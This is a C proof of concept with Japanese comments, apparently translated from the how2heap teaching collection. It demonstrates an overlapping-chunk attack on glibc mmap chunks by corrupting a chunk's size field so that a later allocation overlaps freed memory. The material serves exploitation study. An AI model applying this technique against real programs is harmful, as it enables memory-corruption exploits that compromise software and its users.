#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <unistd.h>

/*
この技法は GLibC のすべてのバージョンで動作するはずです
コンパイル: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`

POC 作者: Maxwell Dulin (Strikeout)
*/
int main()
{
	/*
	GLibC における Mmap チャンクの入門
	==================================
	GLibC では、確保するサイズが非常に大きくなると、malloc は
	通常のヒープ上に確保する代わりに、そのための別のメモリ領域が
	必要だと判断する地点があります。これは mmap_threshold 変数によって決まります。
	チャンクを取得する通常のロジックの代わりに、システムコール *Mmap* が
	使われます。これは仮想メモリの一区画を確保してユーザに返します。

	同様に、解放の処理も異なります。解放されたチャンクが bin や
	ヒープの残りの部分に戻される代わりに、
	別のシステムコール *Munmap* が使われます。これは以前に確保された
	Mmap チャンクのポインタを受け取り、カーネルに返却します。

	Mmap チャンクでは、サイズのメタデータに特別なビット、つまり下位から 2 番目のビットが立っています。
	このビットが立っていれば、そのチャンクは Mmap チャンクとして確保されたものです。

	Mmap チャンクには prev_size と size があります。*size* はチャンクの現在の
	サイズを表します。チャンクの *prev_size* は、Mmap チャンクのサイズからの余り領域を
	表します(すぐ下にあるチャンクのサイズではありません)。
	ただし、fd と bk のポインタは使われません。Mmap チャンクは、GLibC Malloc のほとんどのヒープチャンクとは異なり、
	bin に戻らないためです。解放時には、
	チャンクのサイズがページ境界にアライン(page-aligned)されている必要があります。

	以下の POC は、本質的には overlapping chunk 攻撃を mmap チャンクに対して行うものです。
	これは https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c によく似ています。
	主な違いは、mmap されたチャンクが特別な性質を持ち、
	異なる方法で扱われるため、通常の overlapping chunk 攻撃とは
	異なる攻撃シナリオが生まれることです。他にも行えることがあり、
	例えばシステムライブラリやヒープ自体などを munmap することができます。
	これは、mmap チャンクに対する攻撃の一般的なやり方を示すための、
	単純な概念実証(proof of concept)です。

	GLibC の mmap チャンクの詳細は、次の記事を読んでください:
	http://tukan.farm/2016/07/27/munmap-madness/
	*/

	int* ptr1 = malloc(0x10); 

	printf("これは overlapping chunk 攻撃を、極端に大きなチャンク(mmap チャンク)に対して行うものです。\n");
	printf("極端に大きなチャンクが特別なのは、通常のヒープに置かれる代わりに、専用の mmap された\n");
	printf("メモリ領域に確保されるためです。\n");
	puts("=======================================================\n");
	printf("サイズ 0x100000 の極端に大きなヒープチャンクを 3 つ確保します \n\n");
		
	long long* top_ptr = malloc(0x100000);
	printf("1 つ目の mmap チャンクは LibC の直上に置かれます: %p\n",top_ptr);

	// 以降、すべてのチャンクはメモリ上でヒープに向かって下方向に確保されます。
	long long* mmap_chunk_2 = malloc(0x100000);
	printf("2 つ目の mmap チャンクは LibC の下に置かれます: %p\n", mmap_chunk_2);

	long long* mmap_chunk_3 = malloc(0x100000);
	printf("3 つ目の mmap チャンクは 2 つ目の mmap チャンクの下に置かれます: %p\n", mmap_chunk_3);

	printf("\n現在のシステムのメモリレイアウト \n" \
"================================================\n" \
"実行中のプログラム\n" \
"ヒープ\n" \
"....\n" \
"3 つ目の mmap チャンク\n" \
"2 つ目の mmap チャンク\n" \
"LibC\n" \
"....\n" \
"ld\n" \
"1 つ目の mmap チャンク\n"
"===============================================\n\n" \
);
	
	printf("3 つ目の mmap チャンクの Prev Size: 0x%llx\n", mmap_chunk_3[-2]);
	printf("3 つ目の mmap チャンクの Size: 0x%llx\n\n", mmap_chunk_3[-1]);

	printf("3 つ目の mmap チャンクのサイズを、2 つ目の mmap チャンクと重なるように変更します\n");	
	printf("これにより、両方のチャンクが Munmap されてシステムに返却されます\n");
	printf("ここが脆弱性の発生する箇所です。チャンクの size または prev_size の破壊です\n");

	// 脆弱性!!! これは、不適切なインデックスや、さらに下にあるチャンクからのバッファオーバーフローによって引き起こされる可能性があります。
	// さらに、同じ攻撃は size の代わりに prev_size でも使えます。
	mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2 + 0x10;
	printf("3 つ目の mmap チャンクの新しいサイズ: 0x%llx\n", mmap_chunk_3[-1]);
	printf("3 つ目の mmap チャンクを解放します。これにより 2 つ目と 3 つ目のチャンクが munmap されます\n\n");

	/*
	次の free の呼び出しは、実際には、渡したポインタに対して munmap を呼び出すだけです。
	そのソースコードは https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845 にあります

	通常の free では、データは引き続き書き込みも読み取りもできます(これにより、
	そのチャンクに use after free が生じます)。しかし、チャンクが munmap されると、メモリはカーネルに返却されます。
	このデータを読み書きすると、プログラムはクラッシュします。
	
	この追加の制約があるため、主な目標は、システムからメモリを取り戻して、
	2 つのポインタを同じ場所に割り当てることです。
	*/
	// 2 番目と 3 番目の両方のポインタを munmap します
	free(mmap_chunk_3); 

	/* 
	次のようなコードがあるとクラッシュします:
	mmap_chunk_2[0] = 0xdeadbeef;
	これは、そのメモリが現在のプログラムに割り当てられていないためです。
	*/

	/*
	malloc で非常に大きなチャンクを確保します。これは、以前に解放したチャンクより
	大きくする必要があります。mmapthreshold が 0x202000 に増加しているためです。
	確保サイズが、解放された最大の mmap チャンクのサイズより
	大きくない場合、確保はヒープメモリの通常の領域で行われます。
	*/	
	printf("malloc から非常に大きなチャンクを取得し、mmap されたチャンクを得ます\n");
	printf("これは、以前に munmap/解放したチャンクと重なるはずです\n");
	long long* overlapping_chunk = malloc(0x300000);
	printf("重なったチャンクのポインタ: %p\n", overlapping_chunk);
	printf("重なったチャンクのポインタのサイズ: 0x%llx\n", overlapping_chunk[-1]);

	// 2 つのポインタの間の距離を求めます。
	int distance = mmap_chunk_2 - overlapping_chunk;
	printf("新しいチャンクと 2 つ目の mmap チャンク(munmap 済み)との距離: 0x%x\n", distance);
	printf("書き込み前の mmap チャンク 2 のインデックス 0 の値: %llx\n", mmap_chunk_2[0]);
	
	// 重なったチャンクの値を設定します。
	printf("重なったチャンクの値を設定します\n");
	overlapping_chunk[distance] = 0x1122334455667788;

	// ポインタに書き込まれたことを示します。
	printf("2 つ目のチャンクの値(書き込み後): 0x%llx\n", mmap_chunk_2[0]);
	printf("重なったチャンクの値: 0x%llx\n\n", overlapping_chunk[distance]);
	printf("ドカン! 新しいチャンクが、以前に mmap されたチャンクと重なりました\n");
	assert(mmap_chunk_2[0] == overlapping_chunk[distance]);

	_exit(0); // ライブラリを破壊してしまった場合に備えて、早めに終了します
}
